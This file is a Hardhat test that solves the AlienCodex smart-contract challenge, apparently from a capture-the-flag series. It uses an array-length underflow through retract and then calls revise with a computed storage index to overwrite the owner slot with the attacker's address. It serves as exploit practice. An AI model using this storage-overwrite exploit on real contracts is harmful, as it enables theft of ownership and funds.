const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] AlienCodex Attack', function () {

    let deployer, attacker;
    let baseContract, attackContract;
    let provider;
    let payment;

    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('AlienCodex');
        baseContract = await baseContractFactory.connect(deployer).deploy();
        provider = hre.ethers.provider;

        await baseContract.deployed();

        await baseContract.make_contact()
        expect(
            await baseContract.contact()
        ).to.be.equal(true);
        expect(
            await baseContract.owner()
        ).to.be.equal(deployer.address);
    });

    it('Exploit AlienCodex Attack', async function () {
        await baseContract.connect(attacker).make_contact();
        await baseContract.connect(attacker).retract();
        await baseContract.connect(attacker).revise(ethers.BigNumber.from("35707666377435648211887908874984608119992236509074197713628505308453184860938"), "0x00000000000000000000000070997970C51812dc3A010C7d01b50e0d17dc79C8");
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.owner()
        ).to.be.equal(attacker.address);

    });
});